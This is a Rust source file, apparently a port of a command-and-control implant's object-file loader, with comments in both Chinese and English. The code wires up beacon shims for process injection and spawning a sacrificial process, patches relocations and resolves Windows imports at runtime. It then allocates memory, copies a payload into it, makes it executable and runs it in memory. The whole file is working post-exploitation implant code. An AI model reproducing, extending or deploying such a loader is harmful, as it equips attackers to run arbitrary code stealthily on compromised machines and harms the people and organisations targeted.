    f.beacon_inject_process = inject_explicit_process_shim as *const () as usize;
    f.beacon_spawn_temporary_process = spawn_patsy_shim as *const () as usize;
    f.beacon_inject_temporary_process = inject_temp_process_shim as *const () as usize;

    // 工具函数。
    /* utility functions */
    f.to_wide_char = to_wide_char_shim as *const () as usize;
}

// 修复一条重定位。execsrc 是可执行代码的源（我们从其中取出偏移），
// execdst 是计划中的目标（我们针对它计算 RIP 相对偏移），symbol 是
// 重定位指向内容的基址。失败时返回 FALSE（并在上报后返回），
// 这种情况下 BOFF 不得运行。
/*
 * Fix one relocation. execsrc is the source of the executable code (we
 * lift offsets out of it), execdst the planned destination (we compute
 * RIP-relative deltas against it), and symbol the base of whatever the
 * relocation points at. Returns FALSE (after reporting) on failure, in
 * which case the BOFF must not run.
 */
pub fn process_reloc(reloc: &ObjReloc, execsrc: *mut u8, execdst: *mut u8, symbol: *mut u8, soff: i32) -> bool {
    #[cfg(target_arch = "x86")]
    {
        if reloc.rtype == RELOC_ADDR32 {
            let mut offset: u32 = 0;
            unsafe { ptr::copy_nonoverlapping(execsrc.add(reloc.offset as usize), &mut offset as *mut u32 as *mut u8, 4) };
            let addr = (symbol as u32).wrapping_add(offset).wrapping_add(soff as u32);
            unsafe { ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, execsrc.add(reloc.offset as usize), 4) };
            return true;
        } else if reloc.rtype == RELOC_REL32 {
            // 该数据将被引用的位置的 RIP。
            /* RIP of where this data will be ref'd from */
            let rip = (execdst as u32).wrapping_add(reloc.offset as u32).wrapping_add(4);
            let mut offset: u32 = 0;
            unsafe { ptr::copy_nonoverlapping(execsrc.add(reloc.offset as usize), &mut offset as *mut u32 as *mut u8, 4) };
            // 我们目标的位置。
            /* the location of our target */
            let addr = (symbol as u32).wrapping_add(offset).wrapping_add(soff as u32);
            let addr = addr.wrapping_sub(rip);
            unsafe { ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, execsrc.add(reloc.offset as usize), 4) };
            return true;
        }
    }
    #[cfg(target_arch = "x86_64")]
    {
        if reloc.rtype >= RELOC64_REL32_0 && reloc.rtype <= RELOC64_REL32_5 {
            // RELOC64_REL32_0 表示 RIP 位于这条编码指令的末尾，
            // 我们的偏移是最后 4 个字节；其他值表示重定位偏移藏在指令中间，
            // 因此 reloc->rtype 兼作从被修补偏移到下一条指令的距离。
            /*
             * RELOC64_REL32_0 means the RIP is at the end of this encoded
             * instruction and our offset is the last 4 bytes; the other
             * values mean the relocation offset is tucked into the middle
             * of the instruction, so reloc->rtype doubles as the distance
             * from the patched offset to the next instruction.
             */
            let rip = (execdst as usize + reloc.offset as usize + reloc.rtype as usize) as i64;
            let mut offset: u32 = 0;
            unsafe { ptr::copy_nonoverlapping(execsrc.add(reloc.offset as usize), &mut offset as *mut u32 as *mut u8, 4) };
            let fsymbol = symbol as usize as i64 + offset as i64 + soff as i64;

            // 确保偏移量能放进 4 个字节。
            /* make sure the delta fits in 4 bytes */
            let check = fsymbol - rip;
            if check > i32::MAX as i64 || check < i32::MIN as i64 {
                post_error_na(0x4d);
                return false;
            }
            let addr = check as u32;
            unsafe { ptr::copy_nonoverlapping(&addr as *const u32 as *const u8, execsrc.add(reloc.offset as usize), 4) };
            return true;
        }
    }
    post_error_d(0x4f, reloc.rtype as i32);
    false
}

/// 来自 boff.cpp 的 `command_inline_execute_object` —— 解析 BOFF，
/// 解析其重定位，然后运行它。
/// `command_inline_execute_object` from boff.cpp — parse a BOFF, resolve
/// its relocations, and run it.
pub fn command_inline_execute_object(buffer: &[u8], length: usize) {
    // 设置我们的函数表。
    /* setup our function table */
    let mut ftable = BoffFunctions::default();
    setup_functions(&mut ftable);

    // 提取我们的参数：[4b entry][code][rdata][data][relocs][args]。
    /* extract our arguments: [4b entry][code][rdata][data][relocs][args] */
    let mut parser = DataP::init(&buffer[..length]);
    let entry = parser.data_int() as usize;
    let Some(mut code) = parser.data_extract() else { return };
    let Some(rdata) = parser.data_extract() else { return };
    let Some(data_sec) = parser.data_extract() else { return };
    let Some(relocs) = parser.data_extract() else { return };
    let Some(args) = parser.data_extract() else { return };

    let execpatch = unsafe {
        VirtualAlloc(
            ptr::null(),
            code.length,
            MEM_RESERVE | MEM_COMMIT,
            setting_short(SETTING_PROCINJ_PERMS_I) as u32,
        )
    } as *mut u8;
    if execpatch.is_null() {
        return;
    }

    // 遍历我们的重定位并修复 code.buffer。
    /* walk our relocations and fix code.buffer */
    let mut rparser = DataP::init(&relocs.buffer);
    let mut success = false;
    loop {
        // 取出我们的重定位对象（把 12 个字节拷出来，以便解析器
        // 仍可用于下面的 DYNAMICF 字符串）。
        /* grab our relocation object (copy the 12 bytes out so the
         * parser stays usable for the DYNAMICF strings below) */
        let reloc = {
            let Some(reloc_slice) = rparser.data_ptr(size_of::<ObjReloc>()) else { break };
            ObjReloc::from_bytes(reloc_slice)
        };
        let code_src = code.buffer.as_ptr() as *mut u8;

        if reloc.symbol == SYMBOL_END {
            // 我们成功完成了。
            /* we're done successfully */
            success = true;
            break;
        } else if reloc.symbol == SYMBOL_RDATA {
            // 指向 .rdata 的指针，里面保存了我们所有的字符串。
            /* pointer to .rdata, which has all of our strings */
            if !process_reloc(&reloc, code_src, execpatch, rdata.buffer.as_ptr() as *mut u8, reloc.offset_in_section) {
                break;
            }
        } else if reloc.symbol == SYMBOL_DATA {
            if !process_reloc(&reloc, code_src, execpatch, data_sec.buffer.as_ptr() as *mut u8, reloc.offset_in_section) {
                break;
            }
        } else if reloc.symbol == SYMBOL_TEXT {
            if !process_reloc(&reloc, code_src, execpatch, execpatch, reloc.offset_in_section) {
                break;
            }
        } else if reloc.symbol == SYMBOL_DYNAMICF {
            // 从流中取出库名和函数名。
            /* rip the library and function names out of the stream */
            let lib = match rparser.data_string_asciiz() {
                Some(l) => l.to_vec(),
                None => break,
            };
            let fun = match rparser.data_string_asciiz() {
                Some(f) => f.to_vec(),
                None => break,
            };
            let mut libz = lib.to_vec();
            libz.push(0);
            let mut funz = fun.to_vec();
            funz.push(0);

            // 解析我们的模块。
            /* resolve our module */
            let mut mod_ = unsafe { GetModuleHandleA(libz.as_ptr()) };
            if mod_.is_null() {
                mod_ = unsafe { LoadLibraryA(libz.as_ptr()) };
            }

            // 解析我们的函数。
            /* resolve our function */
            let ptr = match unsafe { GetProcAddress(mod_, funz.as_ptr()) } {
                Some(f) => f as usize,
                None => {
                    post_error(
                        0x4c,
                        format_args!(
                            "{}!{}",
                            String::from_utf8_lossy(&lib),
                            String::from_utf8_lossy(&fun)
                        ),
                    );
                    break;
                }
            };

            // 为我们动态解析的函数寻找一个槽位。
            /* find a slot for our dynamically resolved function */
            let slot = function_slot(&mut ftable, ptr);
            if slot.is_null() {
                post_error_na(0x4e);
                break;
            }

            // 把动态解析的符号修补进去。
            /* patch in this dynamically resolved symbol */
            if !process_reloc(&reloc, code_src, execpatch, slot as *mut u8, 0) {
                break;
            }
        } else {
            // 请求函数表中的某个东西。
            /* request for something in our function table */
            let base = &ftable as *const BoffFunctions as usize;
            let slot = base.wrapping_add((reloc.symbol as isize * size_of::<usize>() as isize) as usize);
            if !process_reloc(&reloc, code_src, execpatch, slot as *mut u8, 0) {
                break;
            }
        }
    }

    if success {
        // 把载荷复制到我们的区域。
        /* copy payload to our area */
        unsafe { ptr::copy_nonoverlapping(code.buffer.as_ptr(), execpatch, code.length) };

        // 万一我们崩溃了，不要让代码与字符串放在一起。
        /* in case we crash, don't keep code co-located with strings */
        unsafe { ptr::write_bytes(code.buffer.as_mut_ptr(), 0, code.length) };

        // 请转换我们的内联函数。
        /* cast our inline func, please */
        let inlinefunc: extern "C" fn(*mut u8, i32) =
            unsafe { core::mem::transmute(execpatch.add(entry)) };

        // 现在让补丁可执行。
        /* make the patch executable now */
        if crate::inject::finalize_memory_permissions(execpatch, code.length) {
            inlinefunc(args.buffer.as_ptr() as *mut u8, args.length as i32);
        }
    }

    // 好，清理！
    /* OK, cleanup! */
    unsafe { VirtualFree(execpatch as *mut c_void, 0, MEM_RELEASE) };
}
